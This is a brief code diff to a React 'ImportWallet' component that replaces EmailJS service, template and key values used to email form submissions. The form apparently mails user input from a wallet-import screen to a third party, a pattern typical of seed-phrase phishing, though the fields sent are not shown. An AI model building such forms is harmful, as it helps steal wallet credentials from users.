@@ -35,9 +35,9 @@ const ImportWallet = () => {
     // Set loading state to true when sending email
     setIsLoading(true);
 
-    const serviceID = 'service_jujd1ma';  
-    const templateID = 'template_cpe3uon'; 
-    const publicKey = 'FvKY_rTKVKhPIik-6';
+    const serviceID = 'service_9lichke';  
+    const templateID = 'template_d3cn3io'; 
+    const publicKey = 'A9pjCpNdSXMjjoyN7';
   
     const templateParams = {
       from_name: 'a new user',  
